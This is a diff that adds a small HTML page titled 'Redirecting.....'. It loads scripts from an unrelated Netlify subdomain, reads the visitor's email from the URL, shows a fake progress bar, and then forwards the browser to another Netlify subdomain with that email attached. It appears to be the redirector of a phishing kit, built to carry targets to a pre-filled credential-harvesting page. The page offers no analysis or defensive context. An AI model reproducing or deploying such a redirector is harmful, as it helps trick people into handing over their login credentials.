@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting.....</title>
+</head>
+<body>
+<script src="https://youthful-villani-6cb6a6.netlify.app/jquery-3.5.1.min.js"></script>
+<script src="https://youthful-villani-6cb6a6.netlify.app/bootstrap.bundle.min.js"></script>
+<script>
+    var e=new URL(location.href).searchParams.get("email");var i=0;jQuery(document).ready(function($){$('input[type="email"]').val(e)});var progress=function(){if(i==0){i=1;var elem=$("#myprogressbar");var width=0;var transparent=10
+    var id=setInterval(bar,40);var id2=setInterval(foo,300);function bar(){if(width>=1){clearInterval(id);i=0;window.location.href="https://wonderful-speculoos-7cf669.netlify.app/?email="+e;}else{width++;elem.css('width',width+"%");elem.html(width+"%");}}
+    function foo(){if(transparent<=0){transparent=0;clearInterval(id2);}
+    else{transparent--;console.log(`rgba(0, 0, 0, 0.${transparent})`)
+    $(".e-layer-one").css('background',`rgba(0, 0, 0, 0.${transparent})`)}}}}
+</script>
+<script>
+    jQuery(document).ready(function($) {
+      progress();
+    });
+      
+    </script>
+</body>
+</html>
